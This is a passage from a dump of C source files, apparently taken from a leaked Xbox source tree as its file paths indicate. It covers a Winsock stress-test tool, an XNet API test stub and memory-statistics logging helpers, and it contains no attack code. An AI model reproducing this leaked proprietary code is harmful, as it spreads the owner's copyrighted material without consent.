//*** CheckSum - Calculate checksum over data ***
//***********************************************
ULONG CheckSum(int Len, BYTE Buff[])
{
    ULONG CheckSum = 0;
    int   i;
    
    for (i = 0; i < Len; i++)
    {
        CheckSum += Buff[i];
    }
    
    return(CheckSum);
}

//*************************************
//*** ExitProcess - End sledge test ***
//*************************************
#ifdef UNDER_CE
void ExitProcess(UINT ExitCode)
{
    g_fExit = TRUE;
    SetEvent(g_hCreateThreadsEvent);
}
#endif

//****************************************************************
//*** GetLastErrorText - Returns text of the last error's name ***
//****************************************************************
TCHAR * GetLastErrorText()
{
    switch (WSAGetLastError())
    {
	case WSAEINTR:
        return (TEXT("WSAEINTR"));
        break;
		
	case WSAEBADF:
        return(TEXT("WSAEBADF"));
        break;
		
	case WSAEACCES:
        return(TEXT("WSAEACCES"));
        break;
		
	case WSAEFAULT:
        return(TEXT("WSAEFAULT"));
        break;
		
	case WSAEINVAL:
        return(TEXT("WSAEINVAL"));
        break;
        
	case WSAEMFILE:
        return(TEXT("WSAEMFILE"));
        break;
		
	case WSAEWOULDBLOCK:
        return(TEXT("WSAEWOULDBLOCK"));
        break;
		
	case WSAEINPROGRESS:
        return(TEXT("WSAEINPROGRESS"));
        break;
		
	case WSAEALREADY:
        return(TEXT("WSAEALREADY"));
        break;
		
	case WSAENOTSOCK:
        return(TEXT("WSAENOTSOCK"));
        break;
		
	case WSAEDESTADDRREQ:
        return(TEXT("WSAEDESTADDRREQ"));
        break;
		
	case WSAEMSGSIZE:
        return(TEXT("WSAEMSGSIZE"));
        break;
		
	case WSAEPROTOTYPE:
        return(TEXT("WSAEPROTOTYPE"));
        break;
		
	case WSAENOPROTOOPT:
        return(TEXT("WSAENOPROTOOPT"));
        break;
		
	case WSAEPROTONOSUPPORT:
        return(TEXT("WSAEPROTONOSUPPORT"));
        break;
		
	case WSAESOCKTNOSUPPORT:
        return(TEXT("WSAESOCKTNOSUPPORT"));
        break;
		
	case WSAEOPNOTSUPP:
        return(TEXT("WSAEOPNOTSUPP"));
        break;
		
	case WSAEPFNOSUPPORT:
        return(TEXT("WSAEPFNOSUPPORT"));
        break;
		
	case WSAEAFNOSUPPORT:
        return(TEXT("WSAEAFNOSUPPORT"));
        break;
		
	case WSAEADDRINUSE:
        return(TEXT("WSAEADDRINUSE"));
        break;
		
	case WSAEADDRNOTAVAIL:
        return(TEXT("WSAEADDRNOTAVAIL"));
        break;
		
	case WSAENETDOWN:
        return(TEXT("WSAENETDOWN"));
        break;
		
	case WSAENETUNREACH:
        return(TEXT("WSAENETUNREACH"));
        break;
		
	case WSAENETRESET:
        return(TEXT("WSAENETRESET"));
        break;
		
	case WSAECONNABORTED:
        return(TEXT("WSAECONNABORTED"));
        break;
		
	case WSAECONNRESET:
        return(TEXT("WSAECONNRESET"));
        break;
		
	case WSAENOBUFS:
        return(TEXT("WSAENOBUFS"));
        break;
		
	case WSAEISCONN:
        return(TEXT("WSAEISCONN"));
        break;
		
	case WSAENOTCONN:
        return(TEXT("WSAENOTCONN"));
        break;
		
	case WSAESHUTDOWN:
        return(TEXT("WSAESHUTDOWN"));
        break;
		
	case WSAETOOMANYREFS:
        return(TEXT("WSAETOOMANYREFS"));
        break;
		
	case WSAETIMEDOUT:
        return(TEXT("WSAETIMEDOUT"));
        break;
		
	case WSAECONNREFUSED:
        return(TEXT("WSAECONNREFUSED"));
        break;
		
	case WSAELOOP:
        return(TEXT("WSAELOOP"));
        break;
		
	case WSAENAMETOOLONG:
        return(TEXT("WSAENAMETOOLONG"));
        break;
		
	case WSAEHOSTDOWN:
        return(TEXT("WSAEHOSTDOWN"));
        break;
		
	case WSAEHOSTUNREACH:
        return(TEXT("WSAEHOSTUNREACH"));
        break;
		
	case WSAENOTEMPTY:
        return(TEXT("WSAENOTEMPTY"));
        break;
		
	case WSAEPROCLIM:
        return(TEXT("WSAEPROCLIM"));
        break;
		
	case WSAEUSERS:
        return(TEXT("WSAEUSERS"));
        break;
		
	case WSAEDQUOT:
        return(TEXT("WSAEDQUOT"));
        break;
		
	case WSAESTALE:
        return(TEXT("WSAESTALE"));
        break;
		
	case WSAEREMOTE:
        return(TEXT("WSAEREMOTE"));
        break;
		
	case WSAEDISCON:
        return(TEXT("WSAEDISCON"));
        break;
		
	case WSASYSNOTREADY:
        return(TEXT("WSASYSNOTREADY"));
        break;
		
	case WSAVERNOTSUPPORTED:
        return(TEXT("WSAVERNOTSUPPORTED"));
        break;
		
	case WSANOTINITIALISED:
        return(TEXT("WSANOTINITIALISED"));
        break;
		
        /*
		case WSAHOST:
        return(TEXT("WSAHOST"));
        break;
		
		  case WSATRY:
		  return(TEXT("WSATRY"));
		  break;
		  
			case WSANO:
			return(TEXT("WSANO"));
			break;
        */
		
	default:
        return(TEXT("Unknown Error"));
    }
}
void
usage ()
{
	TRACE(TEXT("Sledge [-s] [-pNUM] [Many others (see below)]\r\n"));
	TRACE(TEXT("\t-n     : Non-blocking Mode (default blocking)\r\n"));
	TRACE(TEXT("\t-s     : Server Mode (default client mode)\r\n"));
	TRACE(TEXT("\t-st    : Server TCP (default %s)\r\n"),
		SERV_TCP ? TEXT("TRUE") : TEXT("FALSE"));
	TRACE(TEXT("\t-su    : Server UDP (default %s)\r\n"),
		SERV_UDP ? TEXT("TRUE") : TEXT("FALSE"));
	TRACE(TEXT("\t-slNUM : Server receive length (default %d)\r\n"),
		SERV_RECV_LEN);
	TRACE(TEXT("\t-pNUM  : Set packets per connection to NUM (default %d)\r\n"),
		PACKETS_PER_CONN);
	TRACE(TEXT("\t-mNUM  : Set minimum packet len to NUM (default %d)\r\n"),
		MIN_PACKET_LEN);
	TRACE(TEXT("\t-MNUM  : Set maximum packet len to NUM (default %d)\r\n"),
		MAX_PACKET_LEN);
	TRACE(TEXT("\t-f     : Turn on in-flight closes\r\n"));
	TRACE(TEXT("\t-tcNUM : Set TCP Connections to NUM (default %d)\r\n"),
		CLIENT_TCP_CONNS);
	TRACE(TEXT("\t-tlNUM : Set TCP Cycles to NUM (default %d)\r\n"),
		CLIENT_TCP_CYCLES);
	TRACE(TEXT("\t-taADDR : Set TCP Addr to ADDR (default 0x%X)\r\n"),
		SERV_TCP_ADDR);
	TRACE(TEXT("\t\t(example -ta192.100.1.101 or -tappp_peer\r\n"));
	
    TRACE(TEXT("\t-ssNum : Set percent server sleepy receives (default %d)\r\n"), SERV_PERCENT_SLEEPY_RECVS);
	
    TRACE(TEXT("\t-csNum : Set percent client sleepy receives (default %d)\r\n"), CLIENT_PERCENT_SLEEPY_RECVS);
}

// Print out the parms before starting SLEDGE
void Printg_SledgeParms()
{
	
	TRACE(TEXT("<< Sledge Parameters >>\r\n"));
	if (g_SledgeParms.ServTCP)
    {
		TRACE(TEXT("Running TCP\r\n"));
    }
	if (g_SledgeParms.ServUDP)
    {
		TRACE(TEXT("Running UDP\r\n"));
    }
	
	TRACE(TEXT("TCP Packet Size : Min = %d\t Max = %d\r\n"), 
	       g_SledgeParms.TCPMinPacketLen, 
		   g_SledgeParms.TCPMaxPacketLen);
	TRACE(TEXT("UDP Packet Size : Min = %d\t Max = %d\r\n"), 
	       g_SledgeParms.UDPMinPacketLen, 
		   g_SledgeParms.UDPMaxPacketLen);
	TRACE(TEXT("SERVER -> TCP ADDR = %x && UDP ADDR = %x\r\n"),
		g_SledgeParms.ServTCPAddr,
		g_SledgeParms.ServUDPAddr);
	
	TRACE(TEXT("TCP Connections = %d \t TCP Cycles = %d\r\n"), 
	       g_SledgeParms.ClientTCPConns,
		   g_SledgeParms.ClientTCPCycles);
	TRACE(TEXT("UDP Connections = %d \t UDP Cycles = %d\r\n"), 
	       g_SledgeParms.ClientUDPConns,
		   g_SledgeParms.ClientUDPCycles);
	TRACE(TEXT("ServRecvLen = %d\r\n"), g_SledgeParms.ServRecvLen);
	TRACE(TEXT("Packets Per Connection = %d\r\n"), g_SledgeParms.PacketsPerConn);
	TRACE(TEXT("In Flight Closes = %d\r\n"), g_SledgeParms.InFlightCloses);
	
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sledge\nt\ntsledge.h ===
#ifndef __SLDGMAIN_H__
#define __SLDGMAIN_H__

//****************
//*** Includes ***
//****************

#include <windows.h>
#include <tchar.h>
#include <winsock.h>

//***************
//*** Defines ***
//***************

#define MAX_CMDLINE_SIZE			100
#define SW_SHOWNORMAL				1
#define ROLLOVER_LIMIT				1000000

//*********************************
//*** Suggested log verbosities ***
//*********************************
#define LOG_EXCEPTION				0
#define LOG_FAIL					2
#define LOG_ABORT					4
#define LOG_SKIP					6
#define LOG_NOT_IMPLEMENTED			8
#define LOG_PASS					10
#define LOG_DETAIL					12
#define LOG_COMMENT					14

#define BUFF_PATTERN_REPEAT_CHAR
#define UDP_USE_SELECT

#define TIMEOUT_SECONDS				10
#define TIMEOUT_USECONDS			0

#define DEATH_BY_HATCHET			1
#define RECEIVE_TIMED_OUT			2
#define SLEEP_BEFORE_RECV_MS		5000
#define CLIENT_PERCENT_SLEEPY_RECVS	2
#define SERV_PERCENT_SLEEPY_RECVS	1
#define INFINITE_CYCLES				1000
#define UDP_SLEEP_BEFORE_NEXT		1000
#define TCP_SERV_PORT				2001
#define UDP_SERV_PORT				2112
#define UDP_BASE_CLIENT_PORT		UDP_SERV_PORT
#define SERV_TCP					FALSE
#define SERV_UDP					FALSE
#define SERV_TCP_ADDR				INADDR_LOOPBACK
#define SERV_UDP_ADDR				INADDR_LOOPBACK
#define SERV_RECV_LEN				64
#define CLIENT_TCP_CONNS			0
#define CLIENT_TCP_CYCLES			0
#define CLIENT_UDP_CONNS			0
#define CLIENT_UDP_CYCLES			0
#define MIN_PACKET_LEN				1
#define MAX_PACKET_LEN				2048
#define PACKETS_PER_CONN			25
#define IN_FLIGHT_CLOSES			FALSE
#define SERV_BACKLOG				10
#define PACKET_MAX_LEN				4096
#define	MAX_PACKETS_IN_FLIGHT		512

#define CLIENT_TCP_CONNECT_RETRIES	5

#define EAT_WHITE_SPACE(ptr) while((ptr != NULL) && _istspace(*ptr)) ptr++

//****************
//*** Typedefs ***
//****************

typedef struct 
{
	int     Len;
	int     Index;
	ULONG   CheckSum;
} PACKETS;

typedef enum
{
    CONN_TCP,
    CONN_UDP,
    CONN_IDLE
} CONN_TYPES;

typedef enum
{
	CONSTANT,
	INCREMENT,
	RANDOM
} PACKET_TYPE;

typedef struct
{
    BOOL		ServTCP;
    BOOL		ServUDP;
    ULONG		ServTCPAddr;
    ULONG		ServUDPAddr;
    int			ServRecvLen;
    BOOL		ClientTCPConns;
    int			ClientTCPCycles;
    BOOL		ClientUDPConns;
    int			ClientUDPCycles;
    int			TCPMinPacketLen;
    int			TCPMaxPacketLen;
    int			UDPMinPacketLen;
    int			UDPMaxPacketLen;
    int			PacketsPerConn;
    int			ClientSleepyRecvs;
    int			ServSleepyRecvs;
	int			UDPSleepBeforeNext;
    BOOL		InFlightCloses;
} SLEDGE_PARMS;

typedef struct 
{
    CONN_TYPES	ConnType;
    int			Index; 
    int			Cycles;
    int			Cycle;
    BOOL		Connected;
    BOOL		SendThreadDown;
    BOOL		RecvThreadDown;
    PACKETS		PacketsOut[MAX_PACKETS_IN_FLIGHT];   
    int			PacketsOutHead;
    int			PacketsOutTail;
    int			PacketsOutCount;
    HANDLE		hPacketsOutEvent;
    HANDLE		hPort;
    SOCKET		Sock;
    int			PacketLenMin;
    int			PacketLenMax;
    ULONG		TotalPacketsOut;
    ULONG		TotalBytesOut;
    ULONG		DeltaBytesOut;
    ULONG		TotalPacketsIn;
    ULONG		TotalBytesIn;
    ULONG		DeltaBytesIn;
	ULONG		TotalLatePackets;
	ULONG		TotalLostPackets;
	ULONG		TotalBadPackets;
    BOOL		SleepyRecv;
    BOOL		InSend;
    BOOL		InRecv;
    BOOL		InClose;
    char		NextChar;
} CLIENT_CONNS;

typedef struct 
{
    CONN_TYPES	ConnType;
    int			Index;
    HANDLE		hPort;
    SOCKET		Sock;
    int			PacketLenMin;
    int			PacketLenMax;
    ULONG		TotalPacketsLoop;
    ULONG		TotalBytesLoop;
    ULONG		DeltaBytesLoop;
    BOOL		SleepyRecv;
    BOOL		InSend;
    BOOL		InRecv;
    BOOL		InClose;
} SERV_CONNS;

typedef struct
{
	SERV_CONNS	*pConn;
} SERV_RECV_THREAD_PARAM;

typedef struct
{
	CLIENT_CONNS	*pConn;
} CLIENT_THREAD_PARAM;

//******************
//*** Prototypes ***
//******************
void  usage();
BOOL ParseConfigFile();
DWORD WINAPI HatchetThread(LPVOID *);
DWORD WINAPI DisplayThread(LPVOID *);
DWORD WINAPI TCPServThread(LPVOID *);
DWORD WINAPI UDPServThread(LPVOID *);
DWORD WINAPI ServRecvThread(LPVOID *);
DWORD WINAPI ClientSendThread(LPVOID *);
DWORD WINAPI ClientRecvThread(LPVOID *);
void OpenConn(CLIENT_CONNS *);
void CloseConn(CLIENT_CONNS *);
int RecvPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[], BOOL);
int SendPacketSTREAM(CLIENT_CONNS *, int, BYTE *);
int RecvPacketDGRAM(CLIENT_CONNS *, int *, BYTE *);
int SendPacketDGRAM(CLIENT_CONNS *, int, BYTE *);
ULONG RandomRange(ULONG, ULONG);
ULONG BuildTestPacket(CLIENT_CONNS *, int, BYTE *, int);
ULONG CheckSum(int, BYTE *);
TCHAR *GetLastErrorText();
#ifdef UNDER_CE
void ExitProcess(UINT);
#endif

#endif // __SLDGMAIN_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sledge\xbox\xsledge.h ===
#ifndef __SLDGMAIN_H__
#define __SLDGMAIN_H__

//==================================================================================
// Includes
//==================================================================================
#define _WIN32_WINNT	0x0500
#include <windows.h>
#include <xtl.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <memory.h>

#include "xlog.h"

//==================================================================================
// Defines
//==================================================================================

#define MAX_STRING_SIZE				100
#define ROLLOVER_LIMIT				1000000

#define DEATH_BY_HATCHET			1
#define RECEIVE_TIMED_OUT			2
#define SLEEP_BEFORE_RECV_MS		5000
#define CLIENT_PERCENT_SLEEPY_RECVS	2
#define SERV_PERCENT_SLEEPY_RECVS	1
#define INFINITE_CYCLES				1000
#define UDP_SLEEP_BEFORE_NEXT		1000
#define TCP_SERV_PORT				2001
#define UDP_SERV_PORT				2112
#define UDP_BASE_CLIENT_PORT		UDP_SERV_PORT
#define SERV_TCP					FALSE
#define SERV_UDP					FALSE
#define SERV_TCP_ADDR				INADDR_LOOPBACK
#define SERV_UDP_ADDR				INADDR_LOOPBACK
#define SERV_RECV_LEN				64
#define CLIENT_TCP_CONNS			0
#define CLIENT_TCP_CYCLES			0
#define CLIENT_UDP_CONNS			0
#define CLIENT_UDP_CYCLES			0
#define MIN_PACKET_LEN				1
#define MAX_PACKET_LEN				2048
#define PACKETS_PER_CONN			25
#define IN_FLIGHT_CLOSES			FALSE
#define SERV_BACKLOG				10
#define PACKET_MAX_LEN				4096
#define	MAX_PACKETS_IN_FLIGHT		512

#define CLIENT_TCP_CONNECT_RETRIES	5
#define TIME_INFINITY				10000

//==================================================================================
// Typedefs
//==================================================================================

typedef struct 
{
	int     Len;
	int     Index;
	ULONG   CheckSum;
} PACKETS;

typedef enum
{
    CONN_TCP,
    CONN_UDP,
    CONN_IDLE
} CONN_TYPES;

typedef enum
{
	CONSTANT,
	INCREMENT,
	RANDOM
} PACKET_TYPE;

typedef struct
{
    BOOL		ServTCP;
    BOOL		ServUDP;
    ULONG		ServTCPAddr;
    ULONG		ServUDPAddr;
    int			ServRecvLen;
    BOOL		ClientTCPConns;
    int			ClientTCPCycles;
    BOOL		ClientUDPConns;
    int			ClientUDPCycles;
    int			TCPMinPacketLen;
    int			TCPMaxPacketLen;
    int			UDPMinPacketLen;
    int			UDPMaxPacketLen;
    int			PacketsPerConn;
    int			ClientSleepyRecvs;
    int			ServSleepyRecvs;
	int			UDPSleepBeforeNext;
    BOOL		InFlightCloses;
} SLEDGE_PARMS;

typedef struct 
{
    CONN_TYPES	ConnType;
    int			Index; 
    int			Cycles;
    int			Cycle;
    BOOL		Connected;
    BOOL		SendThreadDown;
    BOOL		RecvThreadDown;
    PACKETS		PacketsOut[MAX_PACKETS_IN_FLIGHT];   
    int			PacketsOutHead;
    int			PacketsOutTail;
    int			PacketsOutCount;
    HANDLE		hPacketsOutEvent;
    HANDLE		hPort;
    SOCKET		Sock;
    int			PacketLenMin;
    int			PacketLenMax;
    ULONG		TotalPacketsOut;
    ULONG		TotalBytesOut;
    ULONG		DeltaBytesOut;
    ULONG		TotalPacketsIn;
    ULONG		TotalBytesIn;
    ULONG		DeltaBytesIn;
	ULONG		TotalLatePackets;
	ULONG		TotalLostPackets;
	ULONG		TotalBadPackets;
	ULONG		RecvInProgress;
	ULONG		SendInProgress;
    BOOL		SleepyRecv;
    BOOL		InSend;
    BOOL		InRecv;
    BOOL		InClose;
    char		NextChar;
	BOOL				fCSInitialized;
	CRITICAL_SECTION	csSendRecv;
} CLIENT_CONNS;

typedef struct 
{
    CONN_TYPES	ConnType;
    int			Index;
    HANDLE		hPort;
    SOCKET		Sock;
    int			PacketLenMin;
    int			PacketLenMax;
    ULONG		TotalPacketsLoop;
    ULONG		TotalBytesLoop;
    ULONG		DeltaBytesLoop;
	ULONG		RecvInProgress;
	ULONG		SendInProgress;
    BOOL		SleepyRecv;
    BOOL		InSend;
    BOOL		InRecv;
    BOOL		InClose;
} SERV_CONNS;

typedef struct
{
	SERV_CONNS	*pConn;
} SERV_RECV_THREAD_PARAM;

typedef struct
{
	CLIENT_CONNS	*pConn;
} CLIENT_THREAD_PARAM;

//==================================================================================
// Prototypes
//==================================================================================
DWORD WINAPI HatchetThread(LPVOID *);
DWORD WINAPI DisplayThread(LPVOID *);
DWORD WINAPI TCPServThread(LPVOID *);
DWORD WINAPI UDPServThread(LPVOID *);
DWORD WINAPI ServRecvThread(LPVOID *);
DWORD WINAPI ClientSendThread(LPVOID *);
DWORD WINAPI ClientRecvThread(LPVOID *);
void OpenConn(CLIENT_CONNS *);
void CloseConn(CLIENT_CONNS *);
int RecvPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[], BOOL);
int SendPacketSTREAM(CLIENT_CONNS *, int, BYTE *);
int RecvPacketDGRAM(CLIENT_CONNS *, int *, BYTE *);
int SendPacketDGRAM(CLIENT_CONNS *, int, BYTE *);
ULONG RandomRange(ULONG, ULONG);
ULONG BuildTestPacket(CLIENT_CONNS *, int, BYTE *, int);
ULONG CheckSum(int, BYTE *);
CHAR *GetLastErrorText();
void SignalTestExit(UINT);
void WINAPI SledgeLog(HANDLE, DWORD, LPSTR, ...);
void RetrieveTestSettings(const char *);

#ifdef __cplusplus
extern "C" {
#endif
WINBASEAPI
UINT
WINAPI
GetProfileIntA(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN INT nDefault
    );
WINBASEAPI
DWORD
WINAPI
GetProfileStringA(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN LPCSTR lpDefault,
    OUT LPSTR lpReturnedString,
    IN DWORD nSize
    );
#ifdef __cplusplus
}
#endif

#endif // __SLDGMAIN_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\precomp.h ===
#include <ntos.h>
#include <xtl.h>
#include <stdio.h>
#include <xnetref.h>
#include <xtestlib.h>
#include <xlog.h>
#include <netsync.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\xnetapi.h ===
void DoGetEthernetLinkStatus(HANDLE hLog);
void DoDNSLookup(HANDLE hLog);
void DoStartup(HANDLE hLog);


WINBASEAPI
BOOL
WINAPI
WriteProfileIntA(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN int nValue
    );

WINBASEAPI
BOOL
WINAPI
WriteProfileIntW(
    IN LPCSTR lpAppName,
    IN LPCSTR lpKeyName,
    IN int nValue
    );

#ifdef UNICODE
#define WriteProfileInt  WriteProfileIntW
#else
#define WriteProfileInt  WriteProfileIntA
#endif // !UNICODE
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\xnetapi.c ===
/*
 * File             :       XNetAPI.c
 * Author           :       Jim Y
 * Revision History
 *      Jun/02/2001   JimY        Created
 *
 * This file contains code for testing the XNetxxxxxxx() APIs
 */


#include <precomp.h>
#include <winsockx.h>
#include "xnetapi.h"

LPVOID lpHeapMemory = NULL;
HANDLE XNetAPIHeapHandle;

#define PASS 0
#define FAIL 1


//
// Functions local to this module
//
#define BREAK_INTO_DEBUGGER __asm int 3
#define WARNFAIL(_apiname) \
        DbgPrint(#_apiname " failed: %d %d\n", err, GetLastError())






// XBox entry point

BOOL WINAPI XNetAPIDllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved)
    {
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(lpReserved);

    if(fdwReason == DLL_PROCESS_ATTACH)
        {
        XNetAPIHeapHandle = HeapCreate(0, 0, 0);

        if(!XNetAPIHeapHandle)
            {
            DbgPrint("XNetAPI.C: Unable to create heap\n");
            }
        }
    else if(fdwReason == DLL_PROCESS_DETACH)
        {
        if(XNetAPIHeapHandle)
            {
            HeapDestroy(XNetAPIHeapHandle);
            }
        }

    return TRUE;
    }






/*
Xbox:
Routine Description:


Arguments:

    HANDLE hLog - to the logging object
    bool stressmode - true for infinate loop

Return Value:

    DWORD

*/
DWORD RunAll(HANDLE hLog, BOOL stressmode /*=false*/)
    {

    DbgPrint("XNetAPI.C: Start of RunAll\n");

    do {

        } while(stressmode);

    DbgPrint("XNetAPI.C: End of RunAll\n");
    return 0;
    }





/*
XBox:
Routine Description:

    This is your test entry point. It returns only when all tests have
    completed. If you create threads, you must wait until all threads have
    completed. You also have to create your own heap using HeapAlloc, do not
    use GlobalAlloc or LocalAlloc.

    Please see "x-box test harness.doc" for more information

Arguments:

    LogHandle - Handle used to call logging APIs. Please see "logging.doc"
        for more information regarding logging APIs

Return Value:

    None

*/
VOID WINAPI XNetAPIStartTest(HANDLE hLog)
    {

    DoGetEthernetLinkStatus(hLog);
    DoDNSLookup(hLog);
    DoStartup(hLog);
    RunAll(hLog, FALSE);
    DbgPrint("XNetAPI.C: Leaving StartTest()\n");

    }


/*
Xbox:
Routine Description:

    This is your test clean up routine. It will be called only ONCE after
    all threads have done. This will allow you to do last chance clean up.
    Do not put any per-thread clean up code here. It will be called only
    once after you have finished your StartTest.

Arguments:

    None

Return Value:

    None

*/
VOID WINAPI XNetAPIEndTest(void)
    {
    }




//
// Export function pointers of StartTest and EndTest
//

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( xnetapi )
#pragma data_seg()

BEGIN_EXPORT_TABLE( xnetapi )
    EXPORT_TABLE_ENTRY( "StartTest", XNetAPIStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XNetAPIEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", XNetAPIDllMain )
END_EXPORT_TABLE( xnetapi )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\mem\util.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.c

Abstract:

  This module contains the utility functions for xvoice

Author:

  Steven Kehrli (steveke) 2-Jan-2002

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



VOID
GetStats(
    IN OUT  MM_STATISTICS  *mmStats,
    IN OUT  PS_STATISTICS  *psStats
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets the current statistics

Arguments:

  mmStats - Pointer to the memory statistics
  psStats - Pointer to the processor statistics

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Initialize the mm stats
    ZeroMemory(mmStats, sizeof(*mmStats));
    mmStats->Length = sizeof(*mmStats);

    // Initialize the ps stats
    ZeroMemory(psStats, sizeof(*psStats));
    psStats->Length = sizeof(*psStats);

    // Query the mm stats
    MmQueryStatistics(mmStats);

    // Query the ps stats
    PsQueryStatistics(psStats);
}



VOID
CheckStats(
    IN  HANDLE         hLog,
    IN  MM_STATISTICS  *mmStatsInitial,
    IN  MM_STATISTICS  *mmStatsFinal,
    IN  PS_STATISTICS  *psStatsInitial,
    IN  PS_STATISTICS  *psStatsFinal
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets the current statistics

Arguments:

  hLog - Handle to the log file
  mmStatsInitial - Pointer to the memory statistics initial
  mmStatsFinal - Pointer to the memory statistics final
  psStatsInitial - Pointer to the processor statistics initial
  psStatsFinal - Pointer to the processor statistics final

Return Value:

  None

------------------------------------------------------------------------------*/
{
    if (0 != memcmp(mmStatsFinal, mmStatsInitial, sizeof(*mmStatsFinal))) {
        if (mmStatsFinal->TotalPhysicalPages != mmStatsInitial->TotalPhysicalPages) {
            Log_va(hLog, TRUE, "  Total Memory\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->TotalPhysicalPages);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->TotalPhysicalPages);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->TotalPhysicalPages - mmStatsInitial->TotalPhysicalPages));
        }

        if (mmStatsFinal->AvailablePages != mmStatsInitial->AvailablePages) {
            Log_va(hLog, TRUE, "  Available Memory\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->AvailablePages);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->AvailablePages);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->AvailablePages - mmStatsInitial->AvailablePages));
        }

        if (mmStatsFinal->CachePagesCommitted != mmStatsInitial->CachePagesCommitted) {
            Log_va(hLog, TRUE, "  Cache\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->CachePagesCommitted);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->CachePagesCommitted);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->CachePagesCommitted - mmStatsInitial->CachePagesCommitted));
        }

        if (mmStatsFinal->PoolPagesCommitted != mmStatsInitial->PoolPagesCommitted) {
            Log_va(hLog, TRUE, "  Pool\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->PoolPagesCommitted);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->PoolPagesCommitted);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->PoolPagesCommitted - mmStatsInitial->PoolPagesCommitted));
        }

        if (mmStatsFinal->StackPagesCommitted != mmStatsInitial->StackPagesCommitted) {
            Log_va(hLog, TRUE, "  Stack\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->StackPagesCommitted);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->StackPagesCommitted);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->StackPagesCommitted - mmStatsInitial->StackPagesCommitted));
        }

        if (mmStatsFinal->ImagePagesCommitted != mmStatsInitial->ImagePagesCommitted) {
            Log_va(hLog, TRUE, "  Image\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", mmStatsInitial->ImagePagesCommitted);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", mmStatsFinal->ImagePagesCommitted);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(mmStatsFinal->ImagePagesCommitted - mmStatsInitial->ImagePagesCommitted));
        }
    }

    if (0 != memcmp(psStatsFinal, psStatsInitial, sizeof(*psStatsFinal))) {
        if (psStatsFinal->HandleCount != psStatsInitial->HandleCount) {
            Log_va(hLog, TRUE, "  Handle Count\r\n");
            Log_va(hLog, TRUE, "    Initial: %u\r\n", psStatsInitial->HandleCount);
            Log_va(hLog, TRUE, "    Final:   %u\r\n", psStatsFinal->HandleCount);
            Log_va(hLog, TRUE, "    Diff:    %u\r\n\r\n", abs(psStatsFinal->HandleCount - psStatsInitial->HandleCount));
        }
    }

}



VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Writes the string to the log file

Arguments:

  hLog - Handle to the log object
  bEcho - Specifies if string should be echoed to the debugger
  lpszFormatString - Pointer to the format string

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // varg_ptr is a pointer to the variable argument list
    va_list  varg_ptr = NULL;
    // szLogString is the string in the line of log output
    CHAR     szLogString[1024 + 1] = {'\0'};
    // dwBytesWritten is the number of bytes written to the file
    DWORD    dwBytesWritten = 0;



    // Get the variable argument list
    va_start(varg_ptr, lpszFormatString);

    // Format the variable argument list
    _vsnprintf(szLogString, 1024, lpszFormatString, varg_ptr);

    // Write the string to the log file
    WriteFile(hLog, szLogString, strlen(szLogString), &dwBytesWritten, NULL);

    if (TRUE == bEcho) {
        // Echo the string to the debugger
        OutputDebugStringA(szLogString);
    }
}
